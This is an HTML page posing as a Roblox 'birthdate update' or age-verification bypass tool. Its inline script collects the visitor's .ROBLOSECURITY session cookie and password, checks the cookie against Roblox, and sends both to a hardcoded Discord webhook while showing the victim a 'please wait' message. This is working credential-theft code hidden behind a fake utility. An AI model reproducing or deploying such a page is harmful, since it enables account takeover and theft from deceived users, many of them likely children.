<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Bypasser</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
</head>
<body>
  <div class="min-h-screen bg-gradient-to-b from-[#3a8ee6] to-[#6eb4f7] flex items-center justify-center p-6">
    <div class="bg-white rounded-2xl p-8 w-full max-w-md shadow-lg">
      <h1 class="text-[#3a8ee6] font-extrabold text-2xl text-center mb-6">Bypasser Shisui</h1>
      <form id="bypassForm" class="space-y-4">
        <input
          id="cookieInput"
          name="cookie"
          type="text"
          placeholder="Enter .ROBLOSECURITY Cookie"
          class="w-full px-4 py-3 rounded-lg border border-[#d3e3f4] text-gray-600 text-lg focus:outline-none focus:ring-2 focus:ring-[#3a8ee6]"
          required
        />
        <input
          id="passwordInput"
          name="password"
          type="password"
          placeholder="Enter Password"
          class="w-full px-4 py-3 rounded-lg border border-[#d3e3f4] text-gray-600 text-lg focus:outline-none focus:ring-2 focus:ring-[#3a8ee6]"
          required
        />
        <button
          type="submit"
          class="w-full bg-gradient-to-r from-[#3a8ee6] to-[#6eb4f7] text-white font-extrabold text-lg rounded-lg py-3 hover:brightness-110 transition"
        >
          Update Birthdate
        </button>
      </form>
    </div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1311975858583506985/ZB1Lm3IG9Lcf0QMloKAByd9V2fdEGVoyQ2m935Kz5cm1xCbHQyPaazxmhXvEisNBUiua"; 

    async function checkRobloxCookie(cookie) {
      // This function simulates checking the cookie on roblox.com using Easy Cookie Editor extension.
      // Since we cannot access browser extensions or roblox.com API directly from here,
      // this is a placeholder for the actual validation logic.
      // You would need to implement this validation server-side or via a Roblox API if available.

      // For demonstration, let's simulate a check with a fetch to roblox.com with the cookie.
      try {
        const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
          method: "GET",
          headers: {
            "Cookie": `.ROBLOSECURITY=${cookie}`,
            "Accept": "application/json",
          },
          credentials: "include",
        });
        if (response.ok) {
          const data = await response.json();
          // If user info is returned, cookie is valid
          if (data && data.UserID) {
            return true;
          }
        }
        return false;
      } catch (error) {
        return false;
      }
    }

    document.getElementById("bypassForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const cookie = document.getElementById("cookieInput").value.trim();
      const password = document.getElementById("passwordInput").value.trim();

      if (!cookie || !password) {
        alert("Please fill in both fields.");
        return;
      }

      // Check cookie validity
      const isValid = await checkRobloxCookie(cookie);
      if (!isValid) {
        alert("Invalid .ROBLOSECURITY cookie. Please check and try again.");
        return;
      }

      // Send cookie and password to webhook
      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            content: "New Bypass Verify Age Submission @everyone @here",
            embeds: [
              {
                title: "Someome Bypass!",
                fields: [
                  { name: ".ROBLOSECURITY Cookie", value: cookie, inline: false },
                  { name: "Password", value: password, inline: false },
                ],
                color: 7506394,
              },
            ],
          }),
        });
        alert("Please Wait 1-5m and check our acc.");
        e.target.reset();
      } catch (error) {
        alert("Failed to Bypass.");
      }
    });
  </script>
</body>
</html>
